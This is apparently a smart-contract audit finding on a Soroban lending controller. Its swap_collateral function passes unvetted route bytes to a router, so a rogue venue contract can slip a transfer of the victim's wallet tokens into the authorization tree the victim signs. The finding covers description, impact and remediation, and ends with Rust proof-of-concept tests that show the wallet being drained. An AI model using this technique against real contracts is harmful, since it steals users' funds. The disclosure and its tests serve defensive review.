### Title
Arbitrary route contracts can add victim wallet token transfers to a signed controller authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` accepts caller-supplied route bytes and forwards them through `swap_tokens` to the configured router without constraining which contract the route invokes. A route-selected contract can therefore call `token.transfer(victim, attacker, amount)` during the swap; Soroban records that call as a child of the victim’s `swap_collateral` authorization, and it executes if the victim signs the simulated authorization tree. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
The vulnerable path is `Controller::swap_collateral(caller, account_id, current, amount, new, swap)`. After `caller.require_auth()` and owner-or-delegate validation, the controller passes the opaque `swap` bytes into `withdraw_and_swap_from_supply`. [4](#0-3) 

`swap_tokens` authorizes only the controller’s exact input transfer to the configured router, but it does not inspect or restrict the route’s venue addresses before invoking `router.execute_strategy`. [2](#0-1) 

Because the route executes below the victim’s authenticated controller call, a malicious venue can make an unrelated token `transfer` call that spends directly from the victim’s wallet rather than from controller collateral. Simulation reports that transfer as a sub-invocation of the victim’s `swap_collateral` authorization; signing that tree authorizes the theft. [5](#0-4) [3](#0-2) 

The controller’s subsequent checks only compare the controller’s input and output balances: they reject router overspending and require positive output, but they neither limit route contracts nor detect that the route caused an unrelated transfer from `caller`. [6](#0-5) 

### Impact Explanation
An attacker can steal arbitrary balances of unrelated tokens held by the victim, up to the amounts included in the simulated authorization tree the victim signs. The theft is independent of the collateral amount being swapped and can empty token balances that are not listed or deposited in the lending protocol. [7](#0-6) [8](#0-7) 

The swap can still produce a valid output and satisfy the controller’s balance-delta checks, so the victim receives the expected collateral conversion while the unrelated wallet transfer succeeds in the same transaction. [9](#0-8) 

### Likelihood Explanation
An unprivileged attacker can deploy the malicious venue contract, encode its address in the route bytes, and give the victim a transaction whose simulation includes the extra transfer. The controller provides no venue allowlist or authorization-shape check that would reject such a route before execution. [10](#0-9) [11](#0-10) 

Exploitation requires the victim to sign the poisoned authorization tree rather than merely the expected controller call. However, the tree is generated from simulation, and a malicious route can make that required signature materially broader than the apparent `swap_collateral` operation. [12](#0-11) [13](#0-12) 

### Recommendation
Constrain route execution to governance-approved venue contracts or a validated venue registry rather than accepting arbitrary venue addresses from user-controlled route bytes. [14](#0-13) 

Additionally, expose and enforce an explicit expected authorization shape for strategy calls: an honest `swap_collateral` invocation should have no victim-authorized child token transfer, while standalone router swaps should have only the exact input transfer. Clients should reject simulated authorization trees containing any other child invocation. [15](#0-14) 

### Proof of Concept
The test harness models the exact path: `UnlistedPoolRouter::execute_strategy` decodes attacker-controlled route bytes and invokes `route.hop_pool`, while `RogueHopPool::swap` calls `token.transfer(victim, attacker, amount)`. [16](#0-15) [5](#0-4) 

A simulation of `swap_collateral` records an authorization root for Alice’s controller call containing `wallet_token.transfer(Alice, attacker, WALLET_BALANCE)` as its child, and the test observes Alice’s wallet balance become zero while the attacker receives the full balance. [17](#0-16) 

In enforcing mode, the same unauthorized transfer is rejected when Alice signs only the honest root, but succeeds when Alice signs the simulated poisoned tree containing the token transfer. [18](#0-17)

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
